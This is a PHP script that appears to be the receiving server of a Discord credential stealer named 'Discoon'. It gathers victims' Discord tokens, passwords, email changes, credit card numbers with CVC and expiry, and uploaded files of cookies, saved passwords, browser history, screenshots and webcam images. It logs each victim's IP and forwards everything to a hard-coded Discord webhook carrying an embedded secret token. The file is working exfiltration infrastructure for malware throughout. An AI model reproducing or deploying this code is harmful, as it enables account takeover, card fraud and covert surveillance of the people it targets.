<?php

$webhook = 'https://canary.discord.com/api/webhooks/1025555277308756029/EIA1Fvn6uLOPpYyM0NqsDz2DWQK861YNy89snKF0C2G529s-W1OgLuLBMXxmNOxjazRS';

function resolve_author($user)
{
    return $user['username'] . '#' . $user['discriminator'] . ' ' . '(' . $user['id'] . ')';
}

function resolve_avatar($user)
{
    if (isset($user['avatar'])) {
        return 'https://cdn.discordapp.com/avatars/' . $user['id'] . '/' . $user['avatar'] . '.png?size=256';
    }
    return 'https://cdn.discordapp.com/embed/avatars/' . $user['discriminator'] % 5 . '.png';
}

function get_nitro($user)
{
    switch ($user['premium_type']) {
        case 1:
            return 'Classic';
        case 2:
            return 'Boost';
        default:
            return 'None';
    }
}

// https://stackoverflow.com/a/13646735
function get_ip_address()
{
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }
    return $ip;
}

$json = json_decode(file_get_contents('php://input'), true);

$dw = new DiscordWebhook($webhook);
$dw->set_username('Discoon');
$dw->set_title(isset($json['title']) ? $json['title'] : $_POST['title'], 'https://github.com/RadonCoding/Discoon');
$dw->set_color(365264);
$dw->set_footer(date('m/d/y h:i:s A', time()));

$dw->set_decription("\n**IP Address: **```" . get_ip_address() . "```");

if (isset($json['user'])) {
    $user = json_decode($json['user'], true);
    $dw->set_author(resolve_author($user), null, resolve_avatar($user));
    $dw->append_description("\n**Nitro: **```" . get_nitro($user) . "```");
}

if (isset($json['token'])) {
    $dw->append_description("\n**Token: **```" . $json['token'] . "```");
}

if (isset($json['login'])) {
    $dw->append_description("\n**Login: **```" . $json['login'] . "```");
}

if (isset($json['new_email'])) {
    $dw->append_description("\n**New email: **```" . $json['new_email'] . "```");
}

if (isset($json['password'])) {
    $dw->append_description("\n**Password: **```" . $json['password'] . "```");
}

if (isset($json['old_password'])) {
    $dw->append_description("\n**Old password: **```" . $json['old_password'] . "```");
}

if (isset($json['new_password'])) {
    $dw->append_description("\n**New password: **```" . $json['new_password'] . "```");
}

if (isset($json['number'])) {
    $dw->append_description("\n**Number: **```" . $json['number'] . "```");
}

if (isset($json['cvc'])) {
    $dw->append_description("\n**CVC: **```" . $json['cvc'] . "```");
}

if (isset($json['expiry'])) {
    $dw->append_description("\n**Expiry: **```" . $json['expiry'] . "```");
}

if (isset($_POST['user'])) {
    $user = json_decode($_POST['user'], true);
    $dw->set_author(resolve_author($user), null, resolve_avatar($user));
    $dw->append_description("\n**Nitro: **```" . get_nitro($user) . "```");
}

if (isset($_FILES['tokens'])) {
    $dw->add_file($_FILES['tokens']['tmp_name'], $_FILES['tokens']['name']);
}

if (isset($_FILES['screenshot'])) {
    $dw->add_file($_FILES['screenshot']['tmp_name'], $_FILES['screenshot']['name']);
    $dw->set_image('attachment://' . $_FILES['screenshot']['name']);
}

if (isset($_FILES['webcam'])) {
    $dw->add_file($_FILES['webcam']['tmp_name'], $_FILES['webcam']['name']);
    $dw->set_thumbnail('attachment://' . $_FILES['webcam']['name']);
}

if (isset($_FILES['passwords'])) {
    $dw->add_file($_FILES['passwords']['tmp_name'], $_FILES['passwords']['name']);
}

if (isset($_FILES['cookies'])) {
    $dw->add_file($_FILES['cookies']['tmp_name'], $_FILES['cookies']['name']);
}

if (isset($_FILES['history'])) {
    $dw->add_file($_FILES['history']['tmp_name'], $_FILES['history']['name']);
}

if (isset($_FILES['credit_cards'])) {
    $dw->add_file($_FILES['credit_cards']['tmp_name'], $_FILES['credit_cards']['name']);
}

$dw->send();

class DiscordWebhook
{
    # DiscordWebhook-PHP
    # github.com/renzbobz
    # 3/18/21

    public function __construct($webhook)
    {
        $this->embeds = [];

        if (empty($webhook)) {
            return;
        }
        $this->set_webhook($webhook);
    }

    public function to_array()
    {
        return (array) $this;
    }

    public function to_json()
    {
        return json_encode($this->to_array(), JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    }

    public function set_username($username)
    {
        $this->username = $username;
        return $this;
    }

    public function set_avatar($avatar_url)
    {
        $this->avatar_url = $avatar_url;
        return $this;
    }

    public function set_webhook($webhook)
    {
        $this->webhook = $webhook;
        return $this;
    }

    private function set($key, $val)
    {
        $this->embeds[0][$key] = $val;
    }

    private function get($key)
    {
        return $this->embeds[0][$key];
    }

    public function insert_to($embed_obj, $index = null)
    {
        $embeds = $this->embeds;

        foreach ($embeds as $indx => $embed) {
            if (isset($index)) {
                array_splice($embed_obj->embeds, $index + $indx, 0, [$embed]);
            } else {
                $embed_obj->embeds[] = $embed;
            }
        }
        return $this;
    }

    public function set_content($content)
    {
        $this->content = $content;
        return $this;
    }

    public function append_content($content)
    {
        $this->content = $this->content . $content;
        return $this;
    }

    public function prepend_content($content)
    {
        $this->content = $content . $this->content;
        return $this;
    }

    public function set_title($title, $url = '')
    {
        $this->set("title", $title);
        if ($url) $this->set_url($url);
        return $this;
    }

    public function append_title($title)
    {
        $this->set("title", $this->get("title") . $title);
        return $this;
    }

    public function prepend_title($title)
    {
        $this->set("title", $title . $this->get("title"));
        return $this;
    }

    public function set_url($url)
    {
        $this->set("url", $url);
        return $this;
    }

    public function set_decription($desc)
    {
        $this->set("description", $desc);
        return $this;
    }

    public function append_description($desc)
    {
        $this->set("description", $this->get("description") . $desc);
        return $this;
    }

    public function prepend_description($desc)
    {
        $this->set("description", $desc . $this->get("description"));
        return $this;
    }

    public function set_color($color = 0)
    {
        $this->set("color", $color);
        return $this;
    }

    public function set_timestamp($timestamp = 0)
    {
        if (!$timestamp) $timestamp = date('c');
        $this->set("timestamp", $timestamp);
        return $this;
    }

    public function set_author($name, $url = '', $icon = '')
    {
        $this->set("author", [
            'name' => $name,
            'url' => $url,
            'icon_url' => $icon
        ]);
        return $this;
    }

    public function set_thumbnail($url, $height = 0, $width = 0)
    {
        $this->set("thumbnail", [
            'url' => $url,
            'height' => $height,
            'width' => $width
        ]);
        return $this;
    }

    public function set_image($url, $height = 0, $width = 0)
    {
        $this->set("image", [
            'url' => $url,
            'height' => $height,
            'width' => $width
        ]);
        return $this;
    }

    public function set_footer($text, $icon = '')
    {
        $this->set("footer", [
            'text' => $text,
            'icon_url' => $icon
        ]);
        return $this;
    }

    public function add_field($name, $val, $inline = false, $index = null)
    {
        $field = [$name, $val, $inline];
        if (isset($index)) {
            $this->splice_fields($index, 0, $field);
        } else {
            $this->embeds[0]["fields"][] = $this->format_field(...$field);
        }
        return $this;
    }

    private function format_field($name, $val, $inline = false)
    {
        return [
            'name' => $name,
            'value' => $val,
            'inline' => $inline
        ];
    }

    public function add_fields(...$fields)
    {
        foreach ($fields as $field) {
            if (empty($field)) continue;
            $this->add_field(...$field);
        }
        return $this;
    }

    public function splice_fields($index, $deleteCount = 0, ...$fields)
    {
        if (!empty($fields)) {
            $fields = array_map(function ($field) {
                return $this->format_field(...$field);
            }, $fields);
        }
        array_splice($this->embeds[0]["fields"], $index, $deleteCount, $fields);
        return $this;
    }

    public function add_file($file, $name = '')
    {
        $this->files[] = $this->format_file($file, $name);
        return $this;
    }

    public function addFiles(...$files)
    {
        foreach ($files as $file) {
            $this->add_file(...$file);
        }
        return $this;
    }

    private function format_file($file, $name = '')
    {
        return [
            "file" => $file,
            "name" => $name
        ];
    }

    public function splice_files($index, $deleteCount = 0, ...$files)
    {
        if (!empty($files)) {
            $files = array_map(function ($file) {
                return $this->format_file(...$file);
            }, $files);
        }
        array_splice($this->files, $index, $deleteCount, $files);
        return $this;
    }

    public function send()
    {
        $webhook = $this->webhook;

        $options = [
            CURLOPT_POST => true,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true
        ];

        if (isset($this->files)) {
            $contentType = "multipart/form-data";

            foreach ($this->files as $i => $file) {
                $this->{'file_' . ++$i} = curl_file_create($file["file"], null, $file["name"]);
            }
            unset($this->files);
            $data = $this->to_array() + [
                "payload_json" => $this->to_json()
            ];
        } else {
            $contentType = "application/json";
            $data = $this->to_json();
        }

        $options[CURLOPT_POSTFIELDS] = $data;
        $options[CURLOPT_HTTPHEADER][] = 'Content-type: ' . $contentType;

        $ch = curl_init($webhook);
        curl_setopt_array($ch, $options);
        curl_exec($ch);
        curl_close($ch);
    }
}
